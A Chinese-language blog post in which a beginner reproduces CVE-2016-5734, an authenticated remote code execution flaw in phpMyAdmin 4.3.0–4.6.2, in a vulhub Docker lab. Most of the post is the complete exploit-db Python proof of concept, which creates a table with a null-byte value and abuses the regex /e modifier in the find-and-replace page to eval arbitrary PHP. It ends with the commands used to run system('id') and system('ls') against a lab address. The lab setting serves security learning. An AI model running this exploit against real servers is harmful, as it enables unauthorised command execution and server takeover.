本人小白一个，本次漏洞复现过程是按照vulhub里面的漏洞说明文档进行的，如有不足请指出，谢谢。  
phpMyAdmin（CVE-2016-5734）（远程代码执行漏洞）  
漏洞复现环境是在kali里面配置的  
vulhub下载链接  
https://github.com/vulhub/vulhub

准备环境  
docker-compose up -d  
![image.png](https://image.3001.net/images/20211018/1634522263_616cd497582c5c89f3829.png!small)环境搭建好后，查看漏洞说明  
cat README.zh-cn.md  
![image.png](https://image.3001.net/images/20211018/1634522276_616cd4a435a835da942de.png!small)根据说明去下载POC：  
https://www.exploit-db.com/exploits/40185

POC如下：  
#!/usr/bin/env python

"""cve-2016-5734.py: PhpMyAdmin 4.3.0 - 4.6.2 authorized user RCE exploit  
Details: Working only at PHP 4.3.0-5.4.6 versions, because of regex break with
null byte fixed in PHP 5.4.7.  
CVE: CVE-2016-5734  
Author: https://twitter.com/iamsecurity  
run: ./cve-2016-5734.py -u root --pwd="" http://localhost/pma -c "system('ls
-lua');"  
"""

import requests  
import argparse  
import sys

 **author** = "@iamsecurity"

if **name** == ' **main** ':  
parser = argparse.ArgumentParser()  
parser.add_argument("url", type=str, help="URL with path to PMA")  
parser.add_argument("-c", "--cmd", type=str, help="PHP command(s) to eval()")  
parser.add_argument("-u", "--user", required=True, type=str, help="Valid PMA
user")  
parser.add_argument("-p", "--pwd", required=True, type=str, help="Password for
valid PMA user")  
parser.add_argument("-d", "--dbs", type=str, help="Existing database at a
server")  
parser.add_argument("-T", "--table", type=str, help="Custom table name for
exploit.")  
arguments = parser.parse_args()  
url_to_pma = arguments.url  
uname = arguments.user  
upass = arguments.pwd  
if arguments.dbs:  
db = arguments.dbs  
else:  
db = "test"  
token = False  
custom_table = False  
if arguments.table:  
custom_table = True  
table = arguments.table  
else:  
table = "prgpwn"  
if arguments.cmd:  
payload = arguments.cmd  
else:  
payload = "system('uname -a');"

    
    
    size = 32
    s = requests.Session()
    # you can manually add proxy support it's very simple ;)
    # s.proxies = {'http': "127.0.0.1:8080", 'https': "127.0.0.1:8080"}
    s.verify = False
    sql = '''CREATE TABLE `{0}` (
      `first` varchar(10) CHARACTER SET utf8 NOT NULL
    ) ENGINE=InnoDB DEFAULT CHARSET=latin1;
    INSERT INTO `{0}` (`first`) VALUES (UNHEX('302F6500'));
    '''.format(table)
    
    # get_token
    resp = s.post(url_to_pma + "/?lang=en", dict(
        pma_username=uname,
        pma_password=upass
    ))
    if resp.status_code is 200:
        token_place = resp.text.find("token=") + 6
        token = resp.text[token_place:token_place + 32]
    if token is False:
        print("Cannot get valid authorization token.")
        sys.exit(1)
    
    if custom_table is False:
        data = {
            "is_js_confirmed": "0",
            "db": db,
            "token": token,
            "pos": "0",
            "sql_query": sql,
            "sql_delimiter": ";",
            "show_query": "0",
            "fk_checks": "0",
            "SQL": "Go",
            "ajax_request": "true",
            "ajax_page_request": "true",
        }
        resp = s.post(url_to_pma + "/import.php", data, cookies=requests.utils.dict_from_cookiejar(s.cookies))
        if resp.status_code == 200:
            if "success" in resp.json():
                if resp.json()["success"] is False:
                    first = resp.json()["error"][resp.json()["error"].find("<code>")+6:]
                    error = first[:first.find("</code>")]
                    if "already exists" in error:
                        print(error)
                    else:
                        print("ERROR: " + error)
                        sys.exit(1)
    # build exploit
    exploit = {
        "db": db,
        "table": table,
        "token": token,
        "goto": "sql.php",
        "find": "0/e\0",
        "replaceWith": payload,
        "columnIndex": "0",
        "useRegex": "on",
        "submit": "Go",
        "ajax_request": "true"
    }
    resp = s.post(
        url_to_pma + "/tbl_find_replace.php", exploit, cookies=requests.utils.dict_from_cookiejar(s.cookies)
    )
    if resp.status_code == 200:
        result = resp.json()["message"][resp.json()["message"].find("</a>")+8:]
        if len(result):
            print("result: " + result)
            sys.exit(0)
        print(
            "Exploit failed!\n"
            "Try to manually set exploit parameters like --table, --database and --token.\n"
            "Remember that servers with PHP version greater than 5.4.6"
            " is not exploitable, because of warning about null byte in regexp"
        )
        sys.exit(1)
    

访问phpmyadmin登录页面![image.png](https://image.3001.net/images/20211018/1634522304_616cd4c045296104b81d5.png!small)输入root/root，登录  
![image.png](https://image.3001.net/images/20211018/1634522311_616cd4c7911998e1964a9.png!small)利用POC进行漏洞利用  
根据说明文档里面的提示  
![image.png](https://image.3001.net/images/20211018/1634522321_616cd4d14fcf71616d849.png!small)执行漏洞利用的脚本  
python3 cve-2016-5734.py -c 'system(id);' -u root -p root -d test
http://192.168.190.136:8080  
python3 cve-2016-5734.py -u root --pwd="root" http://192.168.190.136:8080 -c
"system('ls');"  
![image.png](https://image.3001.net/images/20211018/1634522344_616cd4e83bb1a7cf2ccd7.png!small)

